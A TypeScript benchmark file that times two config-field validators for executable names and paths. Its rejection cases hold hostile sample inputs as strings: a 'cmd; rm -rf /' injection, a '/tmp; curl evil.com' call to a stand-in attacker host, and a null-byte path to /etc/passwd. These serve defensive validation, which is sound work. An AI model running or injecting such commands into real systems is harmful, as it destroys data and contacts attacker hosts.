/**
 * Performance benchmarks for exec-safety validation functions.
 *
 * Target: all individual validations should complete in < 1µs/op.
 * These functions run on every config field parse, so they must be fast.
 *
 * Run: pnpm exec vitest bench src/infra/exec-safety.bench.ts
 */
import { bench, describe } from "vitest";
import { isSafeExecutableValue, isSafePathValue } from "./exec-safety.js";

describe("isSafeExecutableValue", () => {
  bench("valid bare name (node)", () => {
    isSafeExecutableValue("node");
  });

  bench("valid path (/usr/local/bin/python3)", () => {
    isSafeExecutableValue("/usr/local/bin/python3");
  });

  bench("valid dot-relative (./scripts/run.sh)", () => {
    isSafeExecutableValue("./scripts/run.sh");
  });

  bench("rejection — shell injection (cmd; rm -rf /)", () => {
    isSafeExecutableValue("cmd; rm -rf /");
  });

  bench("rejection — null byte (cmd\\0injected)", () => {
    isSafeExecutableValue("cmd\0injected");
  });

  bench("rejection — leading dash (--malicious)", () => {
    isSafeExecutableValue("--malicious");
  });

  bench("rejection — null/undefined", () => {
    isSafeExecutableValue(null);
  });
});

describe("isSafePathValue", () => {
  bench("valid short path (/tmp/workspace)", () => {
    isSafePathValue("/tmp/workspace");
  });

  bench("valid long path (100 chars)", () => {
    isSafePathValue("/home/user/" + "a".repeat(89));
  });

  bench("valid max length path (4096 chars)", () => {
    isSafePathValue("/" + "a".repeat(4095));
  });

  bench("rejection — exceeds max length (4097 chars)", () => {
    isSafePathValue("/" + "a".repeat(4096));
  });

  bench("rejection — shell injection (/tmp; curl evil.com)", () => {
    isSafePathValue("/tmp; curl evil.com");
  });

  bench("rejection — null byte (/tmp\\0/etc/passwd)", () => {
    isSafePathValue("/tmp\0/etc/passwd");
  });
});
